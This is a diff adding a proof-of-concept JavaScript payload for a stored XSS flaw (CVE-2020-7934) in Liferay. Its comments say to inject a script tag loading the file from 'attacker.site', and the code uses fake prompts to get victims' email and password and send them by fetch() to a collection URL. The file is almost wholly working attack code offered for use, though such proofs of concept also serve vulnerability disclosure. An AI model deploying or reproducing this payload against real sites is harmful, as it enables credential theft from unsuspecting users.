@@ -1,0 +1,18 @@
+// CVE-2020-7934 Cred Phishing Example Attack
+// Author: 3ndG4me
+// Github: https://github.com/3ndG4me/liferay-xss-7.2.1GA2-poc-report-CVE-2020-7934
+
+// Host this payload with your site and paste in this script tag into a vulnerable field with your URL replaced where relevant:
+// <SCRIPT SRC="//attacker.site/cve-2020-7934.js">
+
+
+var email =prompt("To process this search we need you to confirm your credentials.\n\nPlease confirm your email:", "");
+var password =prompt("To process this search we need you to confirm your credentials.\n\nPlease confirm your password:", "");
+
+
+console.log(email);
+console.log(password);
+var site = "liferay"
+var url = "http://127.0.0.1:6100/anonymous/getsomething?email=" + email + "&password=" + password +"&site="+site ;
+
+fetch(url);
